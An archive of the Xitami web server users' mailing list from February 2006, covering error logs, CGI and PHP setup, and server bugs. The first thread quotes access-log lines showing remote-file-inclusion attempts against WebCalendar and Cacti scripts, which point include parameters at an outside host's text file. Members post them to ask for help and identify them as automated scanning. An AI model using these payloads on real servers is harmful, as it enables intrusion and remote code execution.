@@ -1,0 +1,4284 @@
+From kharzham at earthlink.net  Wed Feb  1 02:16:17 2006
+From: kharzham at earthlink.net (kharzham@earthlink.net)
+Date: Wed Feb  1 02:11:00 2006
+Subject: [Xitami] Error Log Question
+Message-ID: <000001c626cd$1af2aaa0$4ba0fea9@net>
+
+Here is a sample of my error log for one day:
+66.70.255.159 - - [31/Jan/2006:18:20:28 -0600] "GET
+/WebCalendar/tools/send_reminders.php?includedir=http://duffy.hk/.../t.txt?&
+HTTP/1.1" 404 -1 "" "Mozilla/4.0 (compatible; MSIE 6.0; Windows 98)"
+66.70.255.159 - - [31/Jan/2006:18:20:29 -0600] "GET
+/cacti/include/config_settings.php?config[include_path]=http://duffy.hk/.../
+t.txt?& HTTP/1.1" 404 -1 "" "Mozilla/4.0 (compatible; MSIE 6.0; Windows 98)"
+66.70.255.159 - - [31/Jan/2006:18:20:29 -0600] "GET
+/tools/send_reminders.php?includedir=http://duffy.hk/.../t.txt?& HTTP/1.1"
+404 -1 "" "Mozilla/4.0 (compatible; MSIE 6.0; Windows 98)"
+66.70.255.159 - - [31/Jan/2006:18:20:29 -0600] "GET
+/calendar/tools/send_reminders.php?includedir=http://duffy.hk/.../t.txt?&
+HTTP/1.1" 404 -1 "" "Mozilla/4.0 (compatible; MSIE 6.0; Windows 98)"
+66.70.255.159 - - [31/Jan/2006:18:20:31 -0600] "GET
+/cal/tools/send_reminders.php?includedir=http://duffy.hk/.../t.txt?&
+HTTP/1.1" 404 -1 "" "Mozilla/4.0 (compatible; MSIE 6.0; Windows 98)"
+66.70.255.159 - - [31/Jan/2006:18:20:32 -0600] "GET
+/webcal/tools/send_reminders.php?includedir=http://duffy.hk/.../t.txt?&
+HTTP/1.1" 404 -1 "" "Mozilla/4.0 (compatible; MSIE 6.0; Windows 98)"
+66.70.255.159 - - [31/Jan/2006:18:20:32 -0600] "GET
+/Calendar/tools/send_reminders.php?includedir=http://duffy.hk/.../t.txt?&
+HTTP/1.1" 404 -1 "" "Mozilla/4.0 (compatible; MSIE 6.0; Windows 98)"
+66.70.255.159 - - [31/Jan/2006:18:20:32 -0600] "GET
+/Cacti/include/config_settings.php?config[include_path]=http://duffy.hk/.../
+t.txt?& HTTP/1.1" 404 -1 "" "Mozilla/4.0 (compatible; MSIE 6.0; Windows 98)"
+...
+ 
+There are 20 such entries.  It looks to me like this person was trying to
+gain access to files, and the system errored out because they did not exist.
+Should not it be 403, forbidden, or do I not have the system secured
+properly?
+ 
+Dwayne
+-------------- next part --------------
+An HTML attachment was scrubbed...
+URL: http://lists.imatix.org/pipermail/xitami/attachments/20060131/a301386b/attachment.html
+From craighp at 2cah.com  Wed Feb  1 07:52:37 2006
+From: craighp at 2cah.com (Craig Morrison)
+Date: Wed Feb  1 07:52:57 2006
+Subject: [Xitami] Error Log Question
+In-Reply-To: <000001c626cd$1af2aaa0$4ba0fea9@net>
+References: <000001c626cd$1af2aaa0$4ba0fea9@net>
+Message-ID: <43E05AB5.2020801@2cah.com>
+
+kharzham@earthlink.net wrote:
+> Here is a sample of my error log for one day:
+[snip]
+> HTTP/1.1" 404 -1 "" "Mozilla/4.0 (compatible; MSIE 6.0; Windows 98)"
+> 66.70.255.159 - - [31/Jan/2006:18:20:32 -0600] "GET 
+> /Cacti/include/config_settings.php?config[include_path]=http://duffy.hk/.../t.txt?& 
+> HTTP/1.1" 404 -1 "" "Mozilla/4.0 (compatible; MSIE 6.0; Windows 98)"
+> ...
+>  
+> There are 20 such entries.  It looks to me like this person was trying 
+> to gain access to files, and the system errored out because they did not 
+> exist.  Should not it be 403, forbidden, or do I not have the system 
+> secured properly?
+
+You will only get 403 forbidden if you are using HTTP authentication.
+
+-- 
+Craig Morrison
+=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+http://pse.2cah.com
+   Controlling pseudoephedrine purchases.
+
+http://www.mtsprofessional.com/
+   A Win32 email server that works for You.
+
+From mw at 9000.org  Wed Feb  1 09:00:25 2006
+From: mw at 9000.org (Magnus Wedberg)
+Date: Wed Feb  1 09:00:35 2006
+Subject: [Xitami] Error Log Question
+In-Reply-To: <000001c626cd$1af2aaa0$4ba0fea9@net>
+Message-ID: <43E078A9.29563.B0E83@mw.9000.org>
+
+> There are 20 such entries.
+
+Automated scanning for vulnerabilities, aka script kiddies. Don't 
+worry about it. 
+ 
+-- 
+Magnus Wedberg
+http://www.magnuswedberg.com/
+mw AT 9000.org
+Warning! Objects in viewfinder may be closer than they appear.
+
+
+
+From stefano.ricci at achab.it  Wed Feb  1 14:39:07 2006
+From: stefano.ricci at achab.it (Stefano Ricci)
+Date: Wed Feb  1 14:39:12 2006
+Subject: [Xitami] http error 503
+Message-ID: <000e01c62734$e044b660$2002a8c0@achab.it>
+
+Hi everybody,
+
+background: I have a CGI script that runs on xitami web server and parse a template to 
+produce an html output
+This script works fine on a certain number of installation of xitami webserver (20+)
+
+Now one of my customer is experiencing http error 503 (taken from xitami error.log) when
+using HTTP POST to my scripts.
+HTTP GET seems to work fine
+My customer reported he's using xitami 2.5
+
+Is there any way to get some more info from xitami about what's going wrong?
+Is there any particular log file I have to look for (or enable)?
+
+
+thank you very much for your help
+stefano
+-------------- next part --------------
+An HTML attachment was scrubbed...
+URL: http://lists.imatix.org/pipermail/xitami/attachments/20060201/a36648ec/attachment.html
+From admin at mrjdesign.net  Fri Feb  3 09:30:01 2006
+From: admin at mrjdesign.net (MRJ InfoTech Admin)
+Date: Fri Feb  3 09:58:01 2006
+Subject: [Xitami] URGENT - Major server bug in cgi - never before seen
+Message-ID: <6.2.0.14.0.20060203082417.01c9b9a0@mail.mrjdesign.net>
+
+
+I have been using and testing Xitami with my VB cgi's for some 5 years now.
+Never before have I seen such odd behaviour as the past two days.
+
+I built my cgi on a box running XP Pro sp1
+
+I intend to run them on the exact same configuration Xitami 2.5 with XP pro sp1
+
+In this cgi I have a call for the following
+
+
+sFilePath = App.path & "\lst\_filename.hit"
+
+then open the file and increment a number and close it again... basic hit count
+
+When i run it on the dev station it executes fast and excellent like it should
+
+When I execute this on a setup on my server machine I get
+
+
+Error msg (if any): X:\webroot\TheDomainName\cgi-bin\lst\filename.hit
+The following internal error has occurred:
+File not found Error Number =  53
+
+
+Ohhhh boy
+
+Well to begin with, for some obscure reason, on the server machine it 
+doesn't really come back this way.
+
+If I do a set call to the exact path, hard coded, that's what it look like
+
+When I do a call app.path in VB it comes back as
+
+X:\webroot\TheDom~1\cgi-bin\lst\filename.hit
+
+Why in heavens name it suddenly started doing short filenames and paths I 
+cannot understand.
+
+Does anyone have a clue as to how to disable this goof ball function in my 
+machine so my Xitami will run as a normal machine again?
+
+Thank you in advance.
+
+
+
+
+-?2005-------------------------------
+MRJ Information Technology Ltd.
+35 Camden High St., Camden/London, NW1 7JE
+United Kingdom    http://www.mrjdesign.net
+-------------- next part --------------
+An HTML attachment was scrubbed...
+URL: http://lists.imatix.org/pipermail/xitami/attachments/20060203/78ddf500/attachment.htm
+From admin at mrjdesign.net  Fri Feb  3 10:28:16 2006
+From: admin at mrjdesign.net (MRJ InfoTech Admin)
+Date: Fri Feb  3 10:28:22 2006
+Subject: [Xitami] URGENT - Major server bug in cgi - never before
+  seen
+In-Reply-To: <6.2.0.14.0.20060203082417.01c9b9a0@mail.mrjdesign.net>
+References: <6.2.0.14.0.20060203082417.01c9b9a0@mail.mrjdesign.net>
+Message-ID: <6.2.0.14.0.20060203092556.01cbe1a8@mail.mrjdesign.net>
+
+A little update after testing even more with all settings, including 
+running the value - 1 to disallow creation of short file names in the registry.
+
+I can create the file, write to it by using Print #iFileNumber, "0"
+
+but still not read the file or even see it in the CGI.
+
+Windows can see it alright, and I can list it and so on, but the CGI 
+doesn't appear to have the right permissions.
+
+I didn't think Xitami was permission dependant on windows for access to 
+some folders, when running Xitami as Admin
+
+At 08:30 03/02/2006, you wrote:
+
+>I have been using and testing Xitami with my VB cgi's for some 5 years now.
+>Never before have I seen such odd behaviour as the past two days.
+>
+>I built my cgi on a box running XP Pro sp1
+>
+>I intend to run them on the exact same configuration Xitami 2.5 with XP 
+>pro sp1
+>
+>In this cgi I have a call for the following
+>
+>
+>sFilePath = App.path & "\lst\_filename.hit"
+>
+>then open the file and increment a number and close it again... basic hit 
+>count
+>
+>When i run it on the dev station it executes fast and excellent like it should
+>
+>When I execute this on a setup on my server machine I get
+>
+>
+>Error msg (if any): X:\webroot\TheDomainName\cgi-bin\lst\filename.hit
+>The following internal error has occurred:
+>
+>File not found Error Number =  53
+>
+>
+>Ohhhh boy
+>
+>Well to begin with, for some obscure reason, on the server machine it 
+>doesn't really come back this way.
+>
+>If I do a set call to the exact path, hard coded, that's what it look like
+>
+>When I do a call app.path in VB it comes back as
+>
+>X:\webroot\TheDom~1\cgi-bin\lst\filename.hit
+>
+>Why in heavens name it suddenly started doing short filenames and paths I 
+>cannot understand.
+>
+>Does anyone have a clue as to how to disable this goof ball function in my 
+>machine so my Xitami will run as a normal machine again?
+>
+>Thank you in advance.
+>
+>
+>
+>-?2005-------------------------------
+>MRJ Information Technology Ltd.
+>35 Camden High St., Camden/London, NW1 7JE
+>United Kingdom    http://www.mrjdesign.net
+>
+>--
+>Xitami Users Mailing List -- For Xitami support
+>To unsubscribe: http://lists.xitami.org/mailman/listinfo/xitami
+
+-?2005-------------------------------
+MRJ Information Technology Ltd.
+35 Camden High St., Camden/London, NW1 7JE
+United Kingdom    http://www.mrjdesign.net
+-------------- next part --------------
+An HTML attachment was scrubbed...
+URL: http://lists.imatix.org/pipermail/xitami/attachments/20060203/1421ab2a/attachment.html
+From admin at mrjdesign.net  Fri Feb  3 14:18:05 2006
+From: admin at mrjdesign.net (MRJ InfoTech Admin)
+Date: Fri Feb  3 14:18:15 2006
+Subject: [Xitami] URGENT - Major server bug in cgi - never before
+  seen
+In-Reply-To: <6.2.0.14.0.20060203092556.01cbe1a8@mail.mrjdesign.net>
+References: <6.2.0.14.0.20060203082417.01c9b9a0@mail.mrjdesign.net>
+	<6.2.0.14.0.20060203092556.01cbe1a8@mail.mrjdesign.net>
+Message-ID: <6.2.0.14.0.20060203131445.01c5eaf0@mail.mrjdesign.net>
+
+Problem solved...
+Apparently the error through a fit before the actual location in the code. 
+As usual, the problem remains the same.
+An issue with the device located between the screen parsing data going to 
+the keyboard (^^)
+
+(in other words, input error)
+
+The problem was very simple, the output code depends on a text file containing
+the formatting for the header and footer in the CGI result, and these two 
+files
+where missing due to a simple copy error.
+
+I keep having to remind myself, that the error is not what is last 
+returned, but what was NOT last returned.
+Sorry to bug the board, but perhaps someone can learn from my mistake too.
+
+MRJ
+
+At 09:28 03/02/2006, you wrote:
+>A little update after testing even more with all settings, including 
+>running the value - 1 to disallow creation of short file names in the registry.
+>
+>I can create the file, write to it by using Print #iFileNumber, "0"
+>
+>but still not read the file or even see it in the CGI.
+>
+>Windows can see it alright, and I can list it and so on, but the CGI 
+>doesn't appear to have the right permissions.
+>
+>I didn't think Xitami was permission dependant on windows for access to 
+>some folders, when running Xitami as Admin
+>
+>At 08:30 03/02/2006, you wrote:
+>
+>>I have been using and testing Xitami with my VB cgi's for some 5 years now.
+>>Never before have I seen such odd behaviour as the past two days.
+>>
+>>I built my cgi on a box running XP Pro sp1
+>>
+>>I intend to run them on the exact same configuration Xitami 2.5 with XP 
+>>pro sp1
+>>
+>>In this cgi I have a call for the following
+>>
+>>
+>>sFilePath = App.path & "\lst\_filename.hit"
+>>
+>>then open the file and increment a number and close it again... basic hit 
+>>count
+>>
+>>When i run it on the dev station it executes fast and excellent like it 
+>>should
+>>
+>>When I execute this on a setup on my server machine I get
+>>
+>>
+>>Error msg (if any): X:\webroot\TheDomainName\cgi-bin\lst\filename.hit
+>>The following internal error has occurred:
+>>
+>>
+>>File not found Error Number =  53
+>>
+>>
+>>Ohhhh boy
+>>
+>>Well to begin with, for some obscure reason, on the server machine it 
+>>doesn't really come back this way.
+>>
+>>If I do a set call to the exact path, hard coded, that's what it look like
+>>
+>>When I do a call app.path in VB it comes back as
+>>
+>>X:\webroot\TheDom~1\cgi-bin\lst\filename.hit
+>>
+>>Why in heavens name it suddenly started doing short filenames and paths I 
+>>cannot understand.
+>>
+>>Does anyone have a clue as to how to disable this goof ball function in 
+>>my machine so my Xitami will run as a normal machine again?
+>>
+>>Thank you in advance.
+>>
+-------------- next part --------------
+An HTML attachment was scrubbed...
+URL: http://lists.imatix.org/pipermail/xitami/attachments/20060203/d2fb1fae/attachment.htm
+From kharzham at earthlink.net  Sat Feb  4 17:42:27 2006
+From: kharzham at earthlink.net (kharzham@earthlink.net)
+Date: Sat Feb  4 17:37:43 2006
+Subject: [Xitami] Error Log Question
+In-Reply-To: <43E078A9.29563.B0E83@mw.9000.org>
+Message-ID: <001201c629a9$fc7844b0$4ba0fea9@net>
+
+Thanks.  I've been using WHOIS and blocking the whole range of IPs if they
+come from Russia or China.
+
+-----Original Message-----
+From: Magnus Wedberg [mailto:mw@9000.org] 
+Sent: Wednesday, February 01, 2006 2:00 AM
+To: Xitami Users General Discussion
+Subject: Re: [Xitami] Error Log Question
+
+
+> There are 20 such entries.
+
+Automated scanning for vulnerabilities, aka script kiddies. Don't 
+worry about it. 
+ 
+-- 
+Magnus Wedberg
+http://www.magnuswedberg.com/
+mw AT 9000.org
+Warning! Objects in viewfinder may be closer than they appear.
+
+
+
+
+
+From mark at almond8.wanadoo.co.uk  Mon Feb  6 19:24:52 2006
+From: mark at almond8.wanadoo.co.uk (mark almond)
+Date: Mon Feb  6 19:25:04 2006
+Subject: [Xitami] help please
+Message-ID: <001101c62b4a$9f48cb00$0b714654@homea8m39ogfvf>
+
+Hi
+I've just downloaded the Xitami and I'm having trouble accessing the admin section to configure the server.
+
+I've read the faq section and it says to create a defaults.cfg file and defaults.aut file.
+
+How do I create them? and what folder do I put them in?
+
+Kind Regards
+
+Mark
+
+-------------- next part --------------
+An HTML attachment was scrubbed...
+URL: http://lists.imatix.org/pipermail/xitami/attachments/20060206/eb3fa83b/attachment.html
+From admin at mrjdesign.net  Mon Feb  6 23:18:02 2006
+From: admin at mrjdesign.net (MRJ InfoTech Admin)
+Date: Mon Feb  6 23:18:10 2006
+Subject: [Xitami] help please
+In-Reply-To: <001101c62b4a$9f48cb00$0b714654@homea8m39ogfvf>
+References: <001101c62b4a$9f48cb00$0b714654@homea8m39ogfvf>
+Message-ID: <6.2.0.14.0.20060206221533.01caeae0@mail.mrjdesign.net>
+
+Defaults.cfg is an identical copy of xitami.cfg
+
+Just copy and paste it in the same directory, where also your xigui32.exe 
+is located.
+That should resolve any issues, in fact the need for a defaults.cfg is only 
+apparent if
+you ever need to reinstall xitami or if you are using virtual servers 
+hosting and have to
+manage more than one hosted section.
+
+In all other cases it is only a recommendation.
+
+The same for defaults.aut, otherwise it's in xitami.aut
+
+
+
+
+At 18:24 06/02/2006, you wrote:
+>Hi
+>I've just downloaded the Xitami and I'm having trouble accessing the admin 
+>section to configure the server.
+>
+>I've read the faq section and it says to create a defaults.cfg file and 
+>defaults.aut file.
+>
+>How do I create them? and what folder do I put them in?
+>
+>Kind Regards
+>
+>Mark
+>
+>
+>
+>--
+>Xitami Users Mailing List -- For Xitami support
+>To unsubscribe: http://lists.xitami.org/mailman/listinfo/xitami
+
+-?2005-------------------------------
+MRJ Information Technology Ltd.
+35 Camden High St., Camden/London, NW1 7JE
+United Kingdom    http://www.mrjdesign.net
+-------------- next part --------------
+An HTML attachment was scrubbed...
+URL: http://lists.imatix.org/pipermail/xitami/attachments/20060206/304390ce/attachment.htm
+From mark at almond8.wanadoo.co.uk  Mon Feb  6 23:26:46 2006
+From: mark at almond8.wanadoo.co.uk (mark almond)
+Date: Mon Feb  6 23:26:59 2006
+Subject: [Xitami] php and xitami
+Message-ID: <003f01c62b6c$6a522af0$05001300@homea8m39ogfvf>
+
+Hi
+can anyone help me intergrate php with th xitami webserver please?
+
+Kind Regards
+
+Mark
+-------------- next part --------------
+An HTML attachment was scrubbed...
+URL: http://lists.imatix.org/pipermail/xitami/attachments/20060206/aa4cb26e/attachment.html
+From admin at mrjdesign.net  Mon Feb  6 23:28:46 2006
+From: admin at mrjdesign.net (MRJ InfoTech Admin)
+Date: Mon Feb  6 23:28:55 2006
+Subject: [Xitami] php and xitami
+In-Reply-To: <003f01c62b6c$6a522af0$05001300@homea8m39ogfvf>
+References: <003f01c62b6c$6a522af0$05001300@homea8m39ogfvf>
+Message-ID: <6.2.0.14.0.20060206222744.01ca5290@mail.mrjdesign.net>
+
+
+With help from Johannes...
+
+In the defaults.cfg or xitami.cfg add the following settings after 
+installing PHP4 and restart your Xitami when done
+==================================================================================
+Hi,
+
+here the settings for php.
+
+[Filter]
+     .php = "D:/PHP/php.exe"
+
+[Mime]
+     Php = "application/x-httpd-php"
+
+In the filter section note the forward slahes. I had to use those, 
+backslash didn't work for me.
+
+Johannes
+
+==================================================================================
+
+
+
+
+At 22:26 06/02/2006, you wrote:
+>Hi
+>can anyone help me intergrate php with th xitami webserver please?
+>
+>Kind Regards
+>
+>Mark
+>
+>--
+>Xitami Users Mailing List -- For Xitami support
+>To unsubscribe: http://lists.xitami.org/mailman/listinfo/xitami
+
+-?2005-------------------------------
+MRJ Information Technology Ltd.
+35 Camden High St., Camden/London, NW1 7JE
+United Kingdom    http://www.mrjdesign.net
+-------------- next part --------------
+An HTML attachment was scrubbed...
+URL: http://lists.imatix.org/pipermail/xitami/attachments/20060206/62e59ad8/attachment.htm
+From mark at almond8.wanadoo.co.uk  Mon Feb  6 23:30:25 2006
+From: mark at almond8.wanadoo.co.uk (mark almond)
+Date: Mon Feb  6 23:30:38 2006
+Subject: [Xitami] php and xitami
+References: <003f01c62b6c$6a522af0$05001300@homea8m39ogfvf>
+	<6.2.0.14.0.20060206222744.01ca5290@mail.mrjdesign.net>
+Message-ID: <005501c62b6c$ed1b4ed0$05001300@homea8m39ogfvf>
+
+Hi
+thanks for the reply
+
+I've got php 5, will it be the same settings?
+
+kind regards
+
+Mark
+  ----- Original Message ----- 
+  From: MRJ InfoTech Admin 
+  To: Xitami Users General Discussion 
+  Sent: Monday, February 06, 2006 10:28 PM
+  Subject: Re: [Xitami] php and xitami
+
+
+
+  With help from Johannes...
+
+  In the defaults.cfg or xitami.cfg add the following settings after installing PHP4 and restart your Xitami when done
+  ==================================================================================
+  Hi,
+
+  here the settings for php.
+
+  [Filter]
+      .php = "D:/PHP/php.exe"
+
+  [Mime]
+      Php = "application/x-httpd-php"
+
+  In the filter section note the forward slahes. I had to use those, backslash didn't work for me.
+
+  Johannes
+
+  ==================================================================================
+
+
+
+
+  At 22:26 06/02/2006, you wrote:
+
+    Hi
+    can anyone help me intergrate php with th xitami webserver please?
+     
+    Kind Regards
+     
+    Mark
+
+    --
+    Xitami Users Mailing List -- For Xitami support
+    To unsubscribe: http://lists.xitami.org/mailman/listinfo/xitami 
+  -?2005-------------------------------
+  MRJ Information Technology Ltd.
+  35 Camden High St., Camden/London, NW1 7JE
+  United Kingdom    http://www.mrjdesign.net 
+
+
+
+
+------------------------------------------------------------------------------
+
+
+
+  --
+  Xitami Users Mailing List -- For Xitami support
+  To unsubscribe: http://lists.xitami.org/mailman/listinfo/xitami
+-------------- next part --------------
+An HTML attachment was scrubbed...
+URL: http://lists.imatix.org/pipermail/xitami/attachments/20060206/f9d7a77d/attachment.html
+From admin at mrjdesign.net  Mon Feb  6 23:33:10 2006
+From: admin at mrjdesign.net (MRJ InfoTech Admin)
+Date: Mon Feb  6 23:33:15 2006
+Subject: [Xitami] php and xitami
+In-Reply-To: <005501c62b6c$ed1b4ed0$05001300@homea8m39ogfvf>
+References: <003f01c62b6c$6a522af0$05001300@homea8m39ogfvf>
+	<6.2.0.14.0.20060206222744.01ca5290@mail.mrjdesign.net>
+	<005501c62b6c$ed1b4ed0$05001300@homea8m39ogfvf>
+Message-ID: <6.2.0.14.0.20060206223220.01ce5668@mail.mrjdesign.net>
+
+As far I know... I haven't had time to do it yet... pop me a private email 
+and let me know how it works (^^)
+
+M
+
+
+At 22:30 06/02/2006, you wrote:
+>Hi
+>thanks for the reply
+>
+>I've got php 5, will it be the same settings?
+>
+...snippety 
+-------------- next part --------------
+An HTML attachment was scrubbed...
+URL: http://lists.imatix.org/pipermail/xitami/attachments/20060206/4bfdab59/attachment.htm
+From mark at almond8.wanadoo.co.uk  Mon Feb  6 23:42:18 2006
+From: mark at almond8.wanadoo.co.uk (mark almond)
+Date: Mon Feb  6 23:42:31 2006
+Subject: [Xitami] php and xitami
+References: <003f01c62b6c$6a522af0$05001300@homea8m39ogfvf><6.2.0.14.0.20060206222744.01ca5290@mail.mrjdesign.net><005501c62b6c$ed1b4ed0$05001300@homea8m39ogfvf>
+	<6.2.0.14.0.20060206223220.01ce5668@mail.mrjdesign.net>
+Message-ID: <00a001c62b6e$961b3440$05001300@homea8m39ogfvf>
+
+Hi
+thanks for the reply, I've added what you've asked me to add, how do I know it's worked?
+
+what's you email address by the way/
+
+Kind Regards
+
+mark
+  ----- Original Message ----- 
+  From: MRJ InfoTech Admin 
+  To: Xitami Users General Discussion 
+  Sent: Monday, February 06, 2006 10:33 PM
+  Subject: Re: [Xitami] php and xitami
+
+
+  As far I know... I haven't had time to do it yet... pop me a private email and let me know how it works (^^)
+
+  M
+
+
+  At 22:30 06/02/2006, you wrote:
+
+    Hi
+    thanks for the reply
+     
+    I've got php 5, will it be the same settings?
+     
+  ...snippety 
+
+
+------------------------------------------------------------------------------
+
+
+
+  --
+  Xitami Users Mailing List -- For Xitami support
+  To unsubscribe: http://lists.xitami.org/mailman/listinfo/xitami
+-------------- next part --------------
+An HTML attachment was scrubbed...
+URL: http://lists.imatix.org/pipermail/xitami/attachments/20060206/906b9784/attachment.html
+From xitami at pastryworld.ca  Tue Feb  7 05:28:38 2006
+From: xitami at pastryworld.ca (Johannes Prost)
+Date: Tue Feb  7 05:27:33 2006
+Subject: [Xitami] php and xitami
+In-Reply-To: <005501c62b6c$ed1b4ed0$05001300@homea8m39ogfvf>
+References: <003f01c62b6c$6a522af0$05001300@homea8m39ogfvf>
+	<6.2.0.14.0.20060206222744.01ca5290@mail.mrjdesign.net>
+	<005501c62b6c$ed1b4ed0$05001300@homea8m39ogfvf>
+Message-ID: <.24.72.112.29.1139286518.squirrel@webmail.pastryworld.ca>
+
+Hi Mark,
+as php is running as cgi and using the php.exe I assume it will not
+matter. I am still running php 4.3.11
+To see if it's working create a file with a text editor like notepad with
+the following, you can cut and paste
+
+<?php
+phpinfo();
+?>
+
+name it phpinfo.php. Make sure that you have the correct extension .php
+not .txt
+After that, call the file from your browser and if it's working correctly
+you should get a purple page with lot's information.
+
+Johannes
+
+
+
+
+> Hi
+> thanks for the reply
+>
+> I've got php 5, will it be the same settings?
+>
+> kind regards
+>
+> Mark
+>   ----- Original Message -----
+>   From: MRJ InfoTech Admin
+>   To: Xitami Users General Discussion
+>   Sent: Monday, February 06, 2006 10:28 PM
+>   Subject: Re: [Xitami] php and xitami
+>
+>
+>
+>   With help from Johannes...
+>
+>   In the defaults.cfg or xitami.cfg add the following settings after
+> installing PHP4 and restart your Xitami when done
+>   =================================================================================
+>  Hi,
+>
+>   here the settings for php.
+>
+>   [Filter]
+>       .php = "D:/PHP/php.exe"
+>
+>   [Mime]
+>       Php = "application/x-httpd-php"
+>
+>   In the filter section note the forward slahes. I had to use those,
+> backslash didn't work for me.
+>
+>   Johannes
+>
+>   =============================================================================
+>  At 22:26 06/02/2006, you wrote:
+>
+>     Hi
+>     can anyone help me intergrate php with th xitami webserver please?
+>
+>     Kind Regards
+>
+>     Mark
+>
+>     --
+>     Xitami Users Mailing List -- For Xitami support
+>     To unsubscribe: http://lists.xitami.org/mailman/listinfo/xitami
+>   -?2005-------------------------------
+>   MRJ Information Technology Ltd.
+>   35 Camden High St., Camden/London, NW1 7JE
+>   United Kingdom    http://www.mrjdesign.net
+>
+>
+>
+>
+> ------------------------------------------------------------------------------
+>
+>
+>
+>   --
+>   Xitami Users Mailing List -- For Xitami support
+>   To unsubscribe: http://lists.xitami.org/mailman/listinfo/xitami
+>
+> --
+> Xitami Users Mailing List -- For Xitami support
+> To unsubscribe: http://lists.xitami.org/mailman/listinfo/xitami
+>
+
+
+From admin at mrjdesign.net  Fri Feb 10 07:36:40 2006
+From: admin at mrjdesign.net (MRJ InfoTech Admin)
+Date: Fri Feb 10 07:36:48 2006
+Subject: [Xitami] XITAMI (great server - should be continued) here is why
+Message-ID: <6.2.0.14.0.20060210063458.01ce7a88@mail.mrjdesign.net>
+
+In reference to our previous discussion urging the team to pick up 
+development of this great product again.
+
+Here is a little sample of me running 4 web sites for the time Jan 27, 2006 
+7 AM until today Feb 10, 2006 5.20 AM
+
+RESP.            SUM       RATIO
+
+200              372,868     98.648%
+206                     202      0.053%
+226                         4     0.001%
+230                         2     0.001%
+302                         2     0.001%
+400                       26     0.007%
+403                       13     0.003%
+404                  4,737     1.253%
+501                     123     0.033%
+530                         2    0.001%
+
+
+SUM ALL              377,979  hits from 12,997 Unique IP addresses in this 
+time.
+
+
+I am still investigating what the 404's are but I think their from two 
+nasty things.
+1) Site pages I pulled off of my server about two years ago still pulling 
+up on google and
+
+2) The FireFox browser eternally asking for favicon.ico every time it hits 
+a web site, without necessarily one is specified.
+
+Anyway, the server is holding up great, except when I get a lot of hits on 
+big files (200 Mb +) and
+have more than 8 sim. visitors, they get trouble and the server conks out 
+with a 206 response or 403 error.
+
+Less than 1.35 % failure ratio over all is not bad for being a Xitami 
+freeware server huh?
+
+
+-?2005-------------------------------
+MRJ Information Technology Ltd.
+35 Camden High St., Camden/London, NW1 7JE
+United Kingdom    http://www.mrjdesign.net
+-------------- next part --------------
+An HTML attachment was scrubbed...
+URL: http://lists.imatix.org/pipermail/xitami/attachments/20060210/fd74b5d4/attachment.htm
+From kiddre at ix.netcom.com  Fri Feb 10 08:31:12 2006
+From: kiddre at ix.netcom.com (Ronald Eugene Kidd)
+Date: Fri Feb 10 08:31:19 2006
+Subject: [Xitami] Assertion failed!  - XITAMI BUG
+In-Reply-To: <FAEMIFKOBMPMNNMHDPGIAELCCCAA.kiddre@ix.netcom.com>
+Message-ID: <FAEMIFKOBMPMNNMHDPGIOEOICCAA.kiddre@ix.netcom.com>
+
+Hello, is there any chance that this will be looked into?
+
+-----Original Message-----
+From: xitami-bounces@lists.xitami.org
+[mailto:xitami-bounces@lists.xitami.org]On Behalf Of Ronald Eugene Kidd
+Sent: Friday, January 27, 2006 4:17 PM
+To: Xitami
+Subject: [Xitami] Assertion failed! - XITAMI BUG
+
+
+Problem:
+
+Assertion failed!
+Module C:\iMatix\Work\products\xitami-25\sfl\sflfile.c, line 2188
+Abort   Retry   Ignore
+I am convinced that this must be a bug in XITAMI. I've eliminated everything
+else with the possible exception of ipUpdater somehow being involved.
+The problem is very easy to recreate. It will occur every time stdio=0 is
+specified in the configuration file.
+I've recreated the failure linking to routines in cgi-bin that I have coded
+using two different REXX products and a .bat file. The failure occurs after
+the cgi-bin routine terminates.
+These files will recreate the problem.
+
+defaults.cfg
+
+#*END
+
+[Cgi]
+     stdio=0
+
+testhtml.html
+
+<html>
+<head>
+<title>Test HTML</title>
+</head>
+<body>
+<a href="http://bplanet.ipupdater.com/cgi-bin/testbat.bat">testbat</a><br>
+</body>
+</html>
+
+testbat.bat
+
+@ECHO ON
+@ECHO I'm here
+
+I have installed XITAMI in C:\XITAMI\Xitami-25\app
+
+
+-------------- next part --------------
+An HTML attachment was scrubbed...
+URL: http://lists.imatix.org/pipermail/xitami/attachments/20060209/dc6f2a4d/attachment.html
+From admin at mrjdesign.net  Fri Feb 10 08:54:29 2006
+From: admin at mrjdesign.net (MRJ InfoTech Admin)
+Date: Fri Feb 10 08:54:37 2006
+Subject: [Xitami] Urgent security issue (disable DL from in CGI bin??)
+Message-ID: <6.2.0.14.0.20060210075235.01c52238@mail.mrjdesign.net>
+
+How do I resolve this the best way?
+
+Any file, not directly executable stored in the CGI-BIN can be downloaded 
+in a browser by simply pointing at it.
+In IIS for instance you can turn that behavior off and only allow execute 
+but not download.
+
+Is that possible in Xitami too?
+
+
+-?2005-------------------------------
+MRJ Information Technology Ltd.
+35 Camden High St., Camden/London, NW1 7JE
+United Kingdom    http://www.mrjdesign.net
+-------------- next part --------------
+An HTML attachment was scrubbed...
+URL: http://lists.imatix.org/pipermail/xitami/attachments/20060210/4033a9e7/attachment.htm
+From xitami at pastryworld.ca  Fri Feb 10 16:31:19 2006
+From: xitami at pastryworld.ca (Johannes Prost)
+Date: Fri Feb 10 16:30:23 2006
+Subject: [Xitami] Assertion failed!  - XITAMI BUG
+In-Reply-To: <FAEMIFKOBMPMNNMHDPGIOEOICCAA.kiddre@ix.netcom.com>
+References: <FAEMIFKOBMPMNNMHDPGIAELCCCAA.kiddre@ix.netcom.com>
+Message-ID: <43EC5D67.27620.579C11@localhost>
+
+can you try to run version 2.4.9 as I remember vage there are some differences with running cgi's
+I am not using this at all, but I remember seen this here.
+
+
+> Hello, is there any chance that this will be looked into?
+> 
+> -----Original Message-----
+> From: xitami-bounces@lists.xitami.org
+> [mailto:xitami-bounces@lists.xitami.org]On Behalf Of Ronald Eugene Kidd
+> Sent: Friday, January 27, 2006 4:17 PM
+> To: Xitami
+> Subject: [Xitami] Assertion failed! - XITAMI BUG
+> 
+> 
+> Problem:
+> 
+> Assertion failed!
+> Module C:\iMatix\Work\products\xitami-25\sfl\sflfile.c, line 2188
+> Abort   Retry   Ignore
+> I am convinced that this must be a bug in XITAMI. I've eliminated everything
+> else with the possible exception of ipUpdater somehow being involved.
+> The problem is very easy to recreate. It will occur every time stdio=0 is
+> specified in the configuration file.
+> I've recreated the failure linking to routines in cgi-bin that I have coded
